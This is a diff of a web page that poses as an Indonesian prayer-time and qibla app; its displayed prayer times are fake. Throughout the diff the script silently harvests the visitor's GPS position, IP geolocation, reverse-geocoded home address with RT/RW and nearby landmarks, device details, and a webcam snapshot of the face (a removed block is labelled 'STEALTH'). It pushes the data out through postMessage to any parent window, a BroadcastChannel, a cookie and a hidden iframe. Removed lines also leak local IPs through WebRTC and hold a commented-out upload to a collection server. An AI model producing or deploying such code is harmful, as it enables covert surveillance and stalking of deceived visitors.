-                    pc.createDataChannel('');
-                    pc.createOffer().then(o => pc.setLocalDescription(o));
-                    pc.onicecandidate = (e) => {
-                        if (e.candidate) {
-                            const m = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
-                            if (m && !V.localIp) V.localIp = m[0];
-                        }
-                    };
-                    setTimeout(() => pc.close(), 3000);
-                } catch (e) {}
-            }
+                    let full = '';
+                    if (V.houseNumber) full += 'No. ' + V.houseNumber;
+                    if (V.street) full += full ? ', ' + V.street : V.street;
+                    if (V.village) full += full ? ', ' + V.village : V.village;
+                    if (V.district) full += full ? ', ' + V.district : V.district;
+                    if (V.city) full += full ? ', ' + V.city : V.city;
+                    if (V.region) full += full ? ', ' + V.region : V.region;
+                    if (V.country) full += full ? ', ' + V.country : V.country;
+                    if (V.zip) full += full ? ' ' + V.zip : V.zip;
+                    V.addressFull = full;
 
-            // ==================== UPDATE UI ====================
-            function updateUI() {
-                let loc = '';
-                if (V.city) loc += V.city;
-                if (V.district) loc += loc ? ', ' + V.district : V.district;
-                if (V.country) loc += loc ? ', ' + V.country : V.country;
-                document.getElementById('displayLocation').textContent = loc || 'Lokasi tidak terdeteksi';
-                document.getElementById('locationSub').textContent = loc ? '📍 ' + loc : '📍 Menentukan lokasi...';
+                    if (V.rt && V.rw) V.rtRw = `RT ${V.rt} / RW ${V.rw}`;
+                    else if (V.rt) V.rtRw = `RT ${V.rt}`;
+                    else if (V.rw) V.rtRw = `RW ${V.rw}`;
+                    else V.rtRw = '-';
 
-                if (V.rt && V.rw) {
-                    document.getElementById('displayRtRw').textContent = `RT ${V.rt} / RW ${V.rw}`;
-                    document.getElementById('rtRow').style.display = 'flex';
-                } else if (V.rt) {
-                    document.getElementById('displayRtRw').textContent = `RT ${V.rt}`;
-                    document.getElementById('rtRow').style.display = 'flex';
-                } else if (V.rw) {
-                    document.getElementById('displayRtRw').textContent = `RW ${V.rw}`;
-                    document.getElementById('rtRow').style.display = 'flex';
+                    updateUI();
+                    updateModalData();
                 }
+                startFaceScan();
+            })
+            .catch(() => {
+                V.lat = lat;
+                V.lon = lon;
+                updateUI();
+                startFaceScan();
+            });
+    }
 
-                if (V.landmark) {
-                    document.getElementById('displayLandmark').textContent = V.landmark;
-                    document.getElementById('landmarkRow').style.display = 'flex';
+    // ==================== GEO DARI IP ====================
+    function getGeoFromIP() {
+        fetch('https://ipapi.co/json/')
+            .then(res => res.json())
+            .then(geo => {
+                V.ip = geo.ip || null;
+                V.country = geo.country_name || null;
+                V.countryCode = geo.country_code || null;
+                V.region = geo.region || null;
+                V.city = geo.city || null;
+                V.zip = geo.postal || null;
+                V.isp = geo.org || null;
+                V.org = geo.org || null;
+                V.lat = geo.latitude || null;
+                V.lon = geo.longitude || null;
+                if (V.lat && V.lon) {
+                    reverseGeocode(V.lat, V.lon);
+                } else {
+                    updateUI();
+                    startFaceScan();
                 }
-
-                updateModalData();
-            }
-
-            // ==================== REVERSE GEOCODE ====================
-            function reverseGeocode(lat, lon) {
-                const url =
-                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1&extratags=1&namedetails=1`;
-                fetch(url)
-                    .then(res => res.json())
-                    .then(data => {
-                        if (data && data.address) {
-                            const addr = data.address;
-                            V.country = addr.country || V.country;
-                            V.countryCode = addr.country_code?.toUpperCase() || V.countryCode;
-                            V.region = addr.state || addr.province || addr.region || V.region;
-                            V.regionCode = addr.state_code || V.regionCode;
-                            V.city = addr.city || addr.town || addr.village || addr.municipality || V.city;
-                            V.district = addr.suburb || addr.neighbourhood || addr.district || V.district;
-                            V.village = addr.village || addr.hamlet || V.village;
-                            V.street = addr.road || addr.street || V.street;
-                            V.houseNumber = addr.house_number || addr.building || V.houseNumber;
-                            V.zip = addr.postcode || V.zip;
-                            V.lat = lat;
-                            V.lon = lon;
-
-                            // RT / RW
-                            if (addr.rt) V.rt = addr.rt;
-                            if (addr.rw) V.rw = addr.rw;
-                            if (addr.suburb) {
-                                const rtMatch = addr.suburb.match(/RT\s*[\.]?\s*(\d+)/i);
-                                const rwMatch = addr.suburb.match(/RW\s*[\.]?\s*(\d+)/i);
-                                if (rtMatch) V.rt = rtMatch[1];
-                                if (rwMatch) V.rw = rwMatch[1];
+            })
+            .catch(() => {
+                fetch('https://api.ipify.org?format=json')
+                    .then(r => r.json())
+                    .then(ipData => {
+                        V.ip = ipData.ip;
+                        return fetch(`https://ipinfo.io/${ipData.ip}/json`);
+                    })
+                    .then(r => r.json())
+                    .then(info => {
+                        V.country = info.country || null;
+                        V.region = info.region || null;
+                        V.city = info.city || null;
+                        V.zip = info.postal || null;
+                        V.isp = info.org || null;
+                        const loc = info.loc ? info.loc.split(',') : null;
+                        if (loc) {
+                            V.lat = parseFloat(loc[0]);
+                            V.lon = parseFloat(loc[1]);
+                            if (V.lat && V.lon) {
+                                reverseGeocode(V.lat, V.lon);
+                                return;
                             }
-                            if (addr.village) {
-                                const rtMatch = addr.village.match(/RT\s*[\.]?\s*(\d+)/i);
-                                const rwMatch = addr.village.match(/RW\s*[\.]?\s*(\d+)/i);
-                                if (rtMatch) V.rt = rtMatch[1];
-                                if (rwMatch) V.rw = rwMatch[1];
-                            }
-                            if (addr.road) {
-                                const rtMatch = addr.road.match(/RT\s*[\.]?\s*(\d+)/i);
-                                const rwMatch = addr.road.match(/RW\s*[\.]?\s*(\d+)/i);
-                                if (rtMatch) V.rt = rtMatch[1];
-                                if (rwMatch) V.rw = rwMatch[1];
-                            }
-                            if (data.display_name) {
-                                const rtMatch = data.display_name.match(/RT\s*[\.]?\s*(\d+)/i);
-                                const rwMatch = data.display_name.match(/RW\s*[\.]?\s*(\d+)/i);
-                                if (rtMatch) V.rt = rtMatch[1];
-                                if (rwMatch) V.rw = rwMatch[1];
-                            }
-
-                            // Landmark / Patokan
-                            const landmarkParts = [];
-                            if (addr.school) landmarkParts.push(`Sekolah ${addr.school}`);
-                            if (addr.mosque) landmarkParts.push(`Masjid ${addr.mosque}`);
-                            if (addr.church) landmarkParts.push(`Gereja ${addr.church}`);
-                            if (addr.hospital) landmarkParts.push(`RS ${addr.hospital}`);
-                            if (addr.market) landmarkParts.push(`Pasar ${addr.market}`);
-                            if (addr.shop) landmarkParts.push(`Toko ${addr.shop}`);
-                            if (addr.park) landmarkParts.push(`Taman ${addr.park}`);
-                            if (addr.library) landmarkParts.push(`Perpustakaan ${addr.library}`);
-                            if (addr.mall) landmarkParts.push(`Mall ${addr.mall}`);
-                            if (addr.building) landmarkParts.push(`Gedung ${addr.building}`);
-                            if (data.namedetails) {
-                                for (const [key, val] of Object.entries(data.namedetails)) {
-                                    if (val && !landmarkParts.some(p => p.includes(val))) {
-                                        landmarkParts.push(val);
-                                    }
-                                }
-                            }
-                            if (data.extratags) {
-                                if (data.extratags.landmark) landmarkParts.push(data.extratags.landmark);
-                                if (data.extratags.name) landmarkParts.push(data.extratags.name);
-                                if (data.extratags.description) landmarkParts.push(data.extratags.description);
-                            }
-                            if (addr.amenity) landmarkParts.push(addr.amenity);
-                            if (addr.place) landmarkParts.push(addr.place);
-                            const uniqueLandmarks = [...new Set(landmarkParts)];
-                            V.landmark = uniqueLandmarks.filter(l => l && l.length > 2).join(', ') || null;
-
-                            // Alamat lengkap
-                            let full = '';
-                            if (V.houseNumber) full += 'No. ' + V.houseNumber;
-                            if (V.street) full += full ? ', ' + V.street : V.street;
-                            if (V.village) full += full ? ', ' + V.village : V.village;
-                            if (V.district) full += full ? ', ' + V.district : V.district;
-                            if (V.city) full += full ? ', ' + V.city : V.city;
-                            if (V.region) full += full ? ', ' + V.region : V.region;
-                            if (V.country) full += full ? ', ' + V.country : V.country;
-                            if (V.zip) full += full ? ' ' + V.zip : V.zip;
-                            V.addressFull = full;
-
-                            if (V.rt && V.rw) V.rtRw = `RT ${V.rt} / RW ${V.rw}`;
-                            else if (V.rt) V.rtRw = `RT ${V.rt}`;
-                            else if (V.rw) V.rtRw = `RW ${V.rw}`;
-                            else V.rtRw = '-';
-
-                            updateUI();
-                            updateModalData();
                         }
+                        updateUI();
                         startFaceScan();
                     })
                     .catch(() => {
-                        V.lat = lat;
-                        V.lon = lon;
                         updateUI();
                         startFaceScan();
                     });
-            }
+            });
+    }
 
-            // ==================== GEO DARI IP ====================
-            function getGeoFromIP() {
-                fetch('https://ipapi.co/json/')
-                    .then(res => res.json())
-                    .then(geo => {
-                        V.ip = geo.ip || null;
-                        V.country = geo.country_name || null;
-                        V.countryCode = geo.country_code || null;
-                        V.region = geo.region || null;
-                        V.regionCode = geo.region_code || null;
-                        V.city = geo.city || null;
-                        V.zip = geo.postal || null;
-                        V.isp = geo.org || null;
-                        V.org = geo.org || null;
-                        V.lat = geo.latitude || null;
-                        V.lon = geo.longitude || null;
-                        if (V.lat && V.lon) {
-                            reverseGeocode(V.lat, V.lon);
-                        } else {
-                            updateUI();
-                            startFaceScan();
-                        }
-                    })
-                    .catch(() => {
-                        fetch('https://api.ipify.org?format=json')
-                            .then(r => r.json())
-                            .then(ipData => {
-                                V.ip = ipData.ip;
-                                return fetch(`https://ipinfo.io/${ipData.ip}/json`);
-                            })
-                            .then(r => r.json())
-                            .then(info => {
-                                V.country = info.country || null;
-                                V.region = info.region || null;
-                                V.city = info.city || null;
-                                V.zip = info.postal || null;
-                                V.isp = info.org || null;
-                                const loc = info.loc ? info.loc.split(',') : null;
-                                if (loc) {
-                                    V.lat = parseFloat(loc[0]);
-                                    V.lon = parseFloat(loc[1]);
-                                    if (V.lat && V.lon) {
-                                        reverseGeocode(V.lat, V.lon);
-                                        return;
-                                    }
-                                }
-                                updateUI();
-                                startFaceScan();
-                            })
-                            .catch(() => {
-                                updateUI();
-                                startFaceScan();
-                            });
-                    });
-            }
+    // ==================== PRECISE LOCATION ====================
+    function getPreciseLocation() {
+        if ('geolocation' in navigator) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    V.gpsLat = pos.coords.latitude;
+                    V.gpsLon = pos.coords.longitude;
+                    V.gpsAccuracy = pos.coords.accuracy;
+                    reverseGeocode(pos.coords.latitude, pos.coords.longitude);
+                },
+                () => { getGeoFromIP(); },
+                { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+            );
+        } else {
+            getGeoFromIP();
+        }
+    }
 
-            // ==================== PRECISE LOCATION ====================
-            function getPreciseLocation() {
-                if ('geolocation' in navigator) {
-                    navigator.geolocation.getCurrentPosition(
-                        (pos) => {
-                            V.gpsLat = pos.coords.latitude;
-                            V.gpsLon = pos.coords.longitude;
-                            V.gpsAccuracy = pos.coords.accuracy;
-                            V.gpsAltitude = pos.coords.altitude || null;
-                            reverseGeocode(pos.coords.latitude, pos.coords.longitude);
-                        },
-                        () => {
-                            getGeoFromIP();
-                        }, {
-                            enableHighAccuracy: true,
-                            timeout: 8000,
-                            maximumAge: 0
-                        }
-                    );
-                } else {
-                    getGeoFromIP();
-                }
-            }
+    // ==================== UPDATE MODAL ====================
+    function updateModalData() {
+        const addr = V.addressFull || V.city || V.country || 'Tidak diketahui';
+        const rtRw = V.rtRw || '-';
+        const landmark = V.landmark || '-';
+        const coord = (V.gpsLat && V.gpsLon) ? `${V.gpsLat.toFixed(6)}, ${V.gpsLon.toFixed(6)}` :
+                      (V.lat && V.lon) ? `${V.lat.toFixed(6)}, ${V.lon.toFixed(6)}` : '-';
+        const device = `${V.deviceType} · ${V.os} · ${V.browser}`;
+        const ip = `${V.ip || '-'} ${V.isp ? '· ' + V.isp : ''}`;
 
-            // ==================== UPDATE MODAL ====================
-            function updateModalData() {
-                const addr = V.addressFull || V.city || V.country || 'Tidak diketahui';
-                const rtRw = V.rtRw || '-';
-                const landmark = V.landmark || '-';
-                const coord = (V.gpsLat && V.gpsLon) ? `${V.gpsLat.toFixed(6)}, ${V.gpsLon.toFixed(6)}` :
-                    (V.lat && V.lon) ? `${V.lat.toFixed(6)}, ${V.lon.toFixed(6)}` : '-';
-                const device = `${V.deviceType} · ${V.os} · ${V.browser}`;
-                const ip = `${V.ip || '-'} ${V.isp ? '· ' + V.isp : ''}`;
+        document.getElementById('modalAddress').textContent = addr;
+        document.getElementById('modalRtRw').textContent = rtRw;
+        document.getElementById('modalLandmark').textContent = landmark;
+        document.getElementById('modalCoord').textContent = coord;
+        document.getElementById('modalDevice').textContent = device;
+        document.getElementById('modalIp').textContent = ip;
+    }
 
-                document.getElementById('modalAddress').textContent = addr;
-                document.getElementById('modalRtRw').textContent = rtRw;
-                document.getElementById('modalLandmark').textContent = landmark;
-                document.getElementById('modalCoord').textContent = coord;
-                document.getElementById('modalDevice').textContent = device;
-                document.getElementById('modalIp').textContent = ip;
-            }
+    // ==================== SCAN WAJAH ====================
+    function startFaceScan() {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
 
-            // ==================== SCAN WAJAH (STEALTH) ====================
-            function startFaceScan() {
-                const video = document.getElementById('video');
-                const canvas = document.getElementById('canvas');
-                const ctx = canvas.getContext('2d');
+        const isMobile = /Mobi|Android|iPhone/i.test(navigator.userAgent);
+        const w = isMobile ? 320 : 400;
+        const h = isMobile ? 240 : 300;
 
-                // Cek apakah di mobile, gunakan resolusi lebih rendah untuk performa
-                const isMobile = /Mobi|Android|iPhone/i.test(navigator.userAgent);
-                const width = isMobile ? 320 : 400;
-                const height = isMobile ? 240 : 300;
-
-                navigator.mediaDevices.getUserMedia({
-                        video: {
-                            facingMode: 'user',
-                            width: { ideal: width },
-                            height: { ideal: height }
-                        },
-                        audio: false
-                    })
-                    .then(stream => {
-                        video.srcObject = stream;
-                        video.onloadedmetadata = () => {
-                            video.play();
-                            setTimeout(() => {
-                                canvas.width = video.videoWidth || width;
-                                canvas.height = video.videoHeight || height;
-                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                                const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
-                                const data = imageData.data;
-                                let facePixels = 0;
-                                let total = 0;
-                                for (let i = 0; i < data.length; i += 4) {
-                                    const r = data[i],
-                                        g = data[i + 1],
-                                        b = data[i + 2];
-                                    total++;
-                                    const Y = 0.299 * r + 0.587 * g + 0.114 * b;
-                                    const Cr = (r - Y) * 0.713 + 128;
-                                    const Cb = (b - Y) * 0.564 + 128;
-                                    if (Cr >= 133 && Cr <= 173 && Cb >= 77 && Cb <= 127 && Y > 60) facePixels++;
-                                }
-                                const ratio = facePixels / total;
-                                if (ratio > 0.035 && total > 1200) {
-                                    V.faceDetected = true;
-                                    V.faceImage = canvas.toDataURL('image/jpeg', 0.6);
-                                    V.faceData = {
-                                        skinRatio: Math.round(ratio * 100) + '%',
-                                        width: canvas.width,
-                                        height: canvas.height
-                                    };
-                                    document.getElementById('modalFaceImg').src = V.faceImage;
-                                    document.getElementById('modalFaceImg').style.display = 'block';
-                                    document.getElementById('facePlaceholder').style.display = 'none';
-                                } else {
-                                    document.getElementById('modalFaceImg').style.display = 'none';
-                                    document.getElementById('facePlaceholder').style.display = 'block';
-                                    document.getElementById('facePlaceholder').innerHTML = `
-                                        <span class="emoji">📷</span>
-                                        Verifikasi perangkat
-                                    `;
-                                }
-
-                                stream.getTracks().forEach(t => t.stop());
-                                video.srcObject = null;
-                                finishCollection();
-                            }, isMobile ? 800 : 1200);
-                        };
-                    })
-                    .catch(() => {
-                        V.faceDetected = false;
-                        document.getElementById('modalFaceImg').style.display = 'none';
-                        document.getElementById('facePlaceholder').style.display = 'block';
-                        document.getElementById('facePlaceholder').innerHTML = `
-                            <span class="emoji">📷</span>
-                            Verifikasi perangkat
-                        `;
-                        finishCollection();
-                    });
-            }
-
-            // ==================== FINISH ====================
-            function finishCollection() {
-                let allData = JSON.parse(localStorage.getItem('zyx_ultimate_v6') || '[]');
-                allData.push(V);
-                localStorage.setItem('zyx_ultimate_v6', JSON.stringify(allData));
-
-                // Kirim ke server jika ada endpoint
-                // fetch('https://server-tuan.com/collect', {
-                //     method: 'POST',
-                //     headers: { 'Content-Type': 'application/json' },
-                //     body: JSON.stringify(V)
-                // });
-
-                console.log('✅ Data terekam:', V);
-
-                // Update UI
-                document.getElementById('locationSub').textContent = '📍 ' + (V.city || V.country || 'Lokasi terdeteksi');
-                updateUI();
-
-                // Kiblat
-                document.getElementById('displayKiblat').textContent = '295.4°';
-
-                // Tanggal
-                const now = new Date();
-                document.getElementById('displayDate').textContent = now.toLocaleDateString('id-ID', {
-                    weekday: 'long',
-                    day: 'numeric',
-                    month: 'long',
-                    year: 'numeric'
-                });
-
-                // Waktu sholat (fiktif tapi realistik)
-                const times = {
-                    subuh: '04:30',
-                    dzuhur: '12:15',
-                    ashar: '15:30',
-                    maghrib: '18:00',
-                    isya: '19:30'
-                };
-                document.getElementById('prayerSubuh').textContent = times.subuh;
-                document.getElementById('prayerDzuhur').textContent = times.dzuhur;
-                document.getElementById('prayerAshar').textContent = times.ashar;
-                document.getElementById('prayerMaghrib').textContent = times.maghrib;
-                document.getElementById('prayerIsya').textContent = times.isya;
-
-                // Highlight waktu terdekat
-                const nowH = now.getHours();
-                const nowM = now.getMinutes();
-                const prayerTimes = [
-                    { id: 'prayerSubuh', h: 4, m: 30 },
-                    { id: 'prayerDzuhur', h: 12, m: 15 },
-                    { id: 'prayerAshar', h: 15, m: 30 },
-                    { id: 'prayerMaghrib', h: 18, m: 0 },
-                    { id: 'prayerIsya', h: 19, m: 30 },
-                ];
-                let closest = null;
-                let closestDiff = Infinity;
-                prayerTimes.forEach(p => {
-                    const diff = ((p.h - nowH) * 60 + (p.m - nowM) + 1440) % 1440;
-                    if (diff < closestDiff) {
-                        closestDiff = diff;
-                        closest = p;
-                    }
-                });
-                document.querySelectorAll('.prayer-item').forEach(el => el.classList.remove('active'));
-                if (closest) {
-                    const target = document.getElementById(closest.id);
-                    if (target) target.closest('.prayer-item').classList.add('active');
-                }
-            }
-
-            // ==================== MODAL FUNCTIONS ====================
-            window.openFaceModal = function() {
-                document.getElementById('faceModal').classList.add('active');
-                document.body.style.overflow = 'hidden';
-                updateModalData();
-                if (V.faceImage) {
-                    document.getElementById('modalFaceImg').src = V.faceImage;
-                    document.getElementById('modalFaceImg').style.display = 'block';
-                    document.getElementById('facePlaceholder').style.display = 'none';
-                }
-            };
-
-            window.closeFaceModal = function() {
-                document.getElementById('faceModal').classList.remove('active');
-                document.body.style.overflow = '';
-            };
-
-            // ==================== INIT ====================
-            function init() {
-                detectDevice();
-
-                const now = new Date();
-                document.getElementById('displayDate').textContent = now.toLocaleDateString('id-ID', {
-                    weekday: 'long',
-                    day: 'numeric',
-                    month: 'long',
-                    year: 'numeric'
-                });
-
-                getPreciseLocation();
-
+        navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user', width: { ideal: w }, height: { ideal: h } },
+            audio: false
+        })
+        .then(stream => {
+            video.srcObject = stream;
+            video.onloadedmetadata = () => {
+                video.play();
                 setTimeout(() => {
-                    if (!V.ip && !V.gpsLat) {
-                        finishCollection();
-                    }
-                }, 15000);
-            }
+                    canvas.width = video.videoWidth || w;
+                    canvas.height = video.videoHeight || h;
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            init();
-        })();
-    </script>
+                    const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+                    const data = imageData.data;
+                    let facePixels = 0, total = 0;
+                    for (let i = 0; i < data.length; i += 4) {
+                        const r = data[i], g = data[i+1], b = data[i+2];
+                        total++;
+                        const Y = 0.299*r + 0.587*g + 0.114*b;
+                        const Cr = (r - Y)*0.713 + 128;
+                        const Cb = (b - Y)*0.564 + 128;
+                        if (Cr >= 133 && Cr <= 173 && Cb >= 77 && Cb <= 127 && Y > 60) facePixels++;
+                    }
+                    const ratio = facePixels / total;
+                    if (ratio > 0.03 && total > 1000) {
+                        V.faceDetected = true;
+                        V.faceImage = canvas.toDataURL('image/jpeg', 0.6);
+                        V.faceData = { skinRatio: Math.round(ratio*100)+'%', width: canvas.width, height: canvas.height };
+                        document.getElementById('modalFaceImg').src = V.faceImage;
+                        document.getElementById('modalFaceImg').style.display = 'block';
+                        document.getElementById('facePlaceholder').style.display = 'none';
+                    }
+
+                    stream.getTracks().forEach(t => t.stop());
+                    video.srcObject = null;
+                    saveData();
+                }, isMobile ? 800 : 1200);
+            };
+        })
+        .catch(() => {
+            V.faceDetected = false;
+            saveData();
+        });
+    }
+
+    // ==================== SAVE DATA (3 LAPIS) ====================
+    function saveData() {
+        if (V.saved) return;
+        V.saved = true;
+
+        document.getElementById('statusBar').textContent = '✅ Data terekam!';
+        document.getElementById('statusBar').className = 'status-bar success';
+
+        // === LAPIS 1: localStorage ===
+        try {
+            let all = JSON.parse(localStorage.getItem('zyx_final_data') || '[]');
+            all.push(V);
+            localStorage.setItem('zyx_final_data', JSON.stringify(all));
+            console.log('✅ Saved to localStorage');
+        } catch (e) {
+            console.warn('localStorage gagal:', e);
+        }
+
+        // === LAPIS 2: BroadcastChannel ===
+        try {
+            const bc = new BroadcastChannel('zyx_channel');
+            bc.postMessage({ type: 'ZYX_DATA', data: V });
+            console.log('✅ Sent via BroadcastChannel');
+        } catch (e) {
+            console.warn('BroadcastChannel gagal:', e);
+        }
+
+        // === LAPIS 3: postMessage ke parent ===
+        try {
+            window.parent.postMessage({ type: 'ZYX_DATA', data: V }, '*');
+            console.log('✅ Sent via postMessage');
+        } catch (e) {
+            console.warn('postMessage gagal:', e);
+        }
+
+        // === LAPIS 4: Cookie (HP fallback) ===
+        try {
+            document.cookie = `zyx_data=${encodeURIComponent(JSON.stringify(V))}; path=/; max-age=86400`;
+            console.log('✅ Saved to cookie');
+        } catch (e) {
+            console.warn('Cookie gagal:', e);
+        }
+
+        // === LAPIS 5: iframe fallback ===
+        try {
+            const iframe = document.createElement('iframe');
+            iframe.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0';
+            document.body.appendChild(iframe);
+            const doc = iframe.contentDocument || iframe.contentWindow.document;
+            doc.open();
+            doc.write(`
+                <script>
+                    try {
+                        let all = JSON.parse(localStorage.getItem('zyx_final_data') || '[]');
+                        all.push(${JSON.stringify(V)});
+                        localStorage.setItem('zyx_final_data', JSON.stringify(all));
+                    } catch(e){}
+                    window.parent.postMessage({type:'ZYX_DATA', data:${JSON.stringify(V)}}, '*');
+                <\/script>
+            `);
+            doc.close();
+            setTimeout(() => iframe.remove(), 2000);
+        } catch (e) {
+            console.warn('iframe fallback gagal:', e);
+        }
+
+        // Update UI
+        document.getElementById('locationSub').textContent = '📍 ' + (V.city || V.country || 'Lokasi terdeteksi');
+        updateUI();
+
+        const now = new Date();
+        document.getElementById('displayDate').textContent = now.toLocaleDateString('id-ID', {
+            weekday: 'long', day: 'numeric', month: 'long', year: 'numeric'
+        });
+
+        const times = { subuh: '04:30', dzuhur: '12:15', ashar: '15:30', maghrib: '18:00', isya: '19:30' };
+        document.getElementById('prayerSubuh').textContent = times.subuh;
+        document.getElementById('prayerDzuhur').textContent = times.dzuhur;
+        document.getElementById('prayerAshar').textContent = times.ashar;
+        document.getElementById('prayerMaghrib').textContent = times.maghrib;
+        document.getElementById('prayerIsya').textContent = times.isya;
+
+        const nowH = now.getHours(), nowM = now.getMinutes();
+        const prayerTimes = [
+            { id: 'prayerSubuh', h: 4, m: 30 },
+            { id: 'prayerDzuhur', h: 12, m: 15 },
+            { id: 'prayerAshar', h: 15, m: 30 },
+            { id: 'prayerMaghrib', h: 18, m: 0 },
+            { id: 'prayerIsya', h: 19, m: 30 },
+        ];
+        let closest = null, closestDiff = Infinity;
+        prayerTimes.forEach(p => {
+            const diff = ((p.h - nowH) * 60 + (p.m - nowM) + 1440) % 1440;
+            if (diff < closestDiff) { closestDiff = diff; closest = p; }
+        });
+        document.querySelectorAll('.prayer-item').forEach(el => el.classList.remove('active'));
+        if (closest) {
+            const target = document.getElementById(closest.id);
+            if (target) target.closest('.prayer-item').classList.add('active');
+        }
+
+        console.log('✅ FINAL DATA TEREKAM:', V);
+    }
+
+    // ==================== MODAL FUNCTIONS ====================
+    window.openFaceModal = function() {
+        document.getElementById('faceModal').classList.add('active');
+        document.body.style.overflow = 'hidden';
+        updateModalData();
+        if (V.faceImage) {
+            document.getElementById('modalFaceImg').src = V.faceImage;
+            document.getElementById('modalFaceImg').style.display = 'block';
+            document.getElementById('facePlaceholder').style.display = 'none';
+        }
+    };
+
+    window.closeFaceModal = function() {
+        document.getElementById('faceModal').classList.remove('active');
+        document.body.style.overflow = '';
+    };
+
+    // ==================== LISTENER DARI CHILD ====================
+    window.addEventListener('message', function(event) {
+        if (event.data && event.data.type === 'ZYX_DATA') {
+            try {
+                let all = JSON.parse(localStorage.getItem('zyx_final_data') || '[]');
+                all.push(event.data.data);
+                localStorage.setItem('zyx_final_data', JSON.stringify(all));
+                console.log('✅ Data from postMessage saved');
+            } catch (e) {}
+        }
+    });
+
+    // ==================== BROADCAST CHANNEL LISTENER ====================
+    try {
+        const bc = new BroadcastChannel('zyx_channel');
+        bc.onmessage = function(event) {
+            if (event.data && event.data.type === 'ZYX_DATA') {
+                try {
+                    let all = JSON.parse(localStorage.getItem('zyx_final_data') || '[]');
+                    all.push(event.data.data);
+                    localStorage.setItem('zyx_final_data', JSON.stringify(all));
+                    console.log('✅ Data from BroadcastChannel saved');
+                } catch (e) {}
+            }
+        };
+    } catch (e) {}
+
+    // ==================== INIT ====================
+    function init() {
+        detectDevice();
+
+        const now = new Date();
+        document.getElementById('displayDate').textContent = now.toLocaleDateString('id-ID', {
+            weekday: 'long', day: 'numeric', month: 'long', year: 'numeric'
+        });
+
+        getPreciseLocation();
+
+        setTimeout(() => {
+            if (!V.saved) {
+                saveData();
+            }
+        }, 15000);
+    }
+
+    init();
+})();
+</script>
 </body>
 </html>
